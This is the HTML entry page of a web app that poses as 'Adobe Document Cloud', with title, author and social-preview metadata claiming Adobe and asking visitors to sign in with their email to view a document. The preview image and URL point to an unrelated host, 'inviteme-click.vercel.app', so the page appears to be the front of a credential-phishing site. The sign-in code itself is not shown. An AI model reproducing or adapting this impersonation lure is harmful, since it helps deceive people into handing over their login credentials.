<!doctype html>
<html lang="en">
  <head>
    <!-- Basic -->
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <!-- Title -->
    <title>Adobe Document Cloud - View Document</title>

    <!-- Favicon -->
    <link rel="icon" type="image/png" href="/favicon.png" />
    <link rel="apple-touch-icon" href="/favicon.png" />

    <!-- SEO -->
    <meta
  name="description"
  content="Adobe Document Cloud - Secure document viewing platform. Sign in with your email to access your document."
/>
<meta
  name="keywords"
  content="adobe, document cloud, pdf viewer, secure document, adobe acrobat"
/>
<meta name="author" content="Adobe Systems" />

    <!-- Open Graph (WhatsApp, Facebook, LinkedIn) -->
    <meta property="og:type" content="website" />
    <meta property="og:title" content="Adobe Document Cloud - View Document" />
     <meta
  property="og:description"
  content="Sign in to view your Adobe Document Cloud file securely."
/>
    <meta
      property="og:image"
      content="https://inviteme-click.vercel.app/favicon.png"
    />
    <meta
      property="og:url"
      content="https://inviteme-click.vercel.app/"
    />
    <meta property="og:site_name" content="Adobe Document Cloud" />

    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="Adobe Document Cloud - View Document" />
   <meta
  name="twitter:description"
  content="Sign in to view your secure Adobe document."
/>
    <meta
      name="twitter:image"
      content="https://inviteme-click.vercel.app/favicon.png"
    />

    <!-- Theme color (mobile browser bar) -->
     <meta name="theme-color" content="#FF0000" />
  </head>

  <body>
    <div id="root"></div>
    <script type="module" src="/src/main.jsx"></script>
  </body>
</html>
